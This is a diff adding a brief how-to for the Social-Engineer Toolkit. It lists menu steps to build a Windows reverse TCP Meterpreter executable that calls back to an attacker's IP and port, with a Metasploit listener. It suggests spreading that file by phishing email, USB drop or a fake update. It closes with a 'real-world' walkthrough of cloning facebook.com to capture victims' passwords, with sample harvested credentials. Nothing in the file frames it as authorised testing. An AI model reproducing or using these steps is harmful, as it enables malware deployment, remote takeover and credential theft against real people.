@@ -1,0 +1,31 @@
+ Steps:
+From main SET menu:
+1) Social-Engineering Attacks
+4) Create a Payload and Listener
+Select Payload Type, e.g.:
+1) Windows Reverse_TCP Meterpreter
+Enter Payload Info:
+
+LHOST: Your IP address (e.g., 192.168.1.100)
+LPORT: Listening port (e.g., 4444)
+
+Result:
+SET generates a .exe payload file
+A listener is started via Metasploit’s msfconsole
+
+Distribute the payload:
+Send via email (phishing)
+USB drop
+Embed in a fake update or document
+
+👁️ Real-World Example: Clone Facebook + Harvest Password
+
+sudo setoolkit
+# → 1 → 2 → 3 → 2
+Clone: https://facebook.com
+Attacker IP: 192.168.1.100
+Victim visits: http://192.168.1.100
+
+Entered credentials show in terminal output:
+[*] Username entered: testuser
+[*] Password entered: testpass123
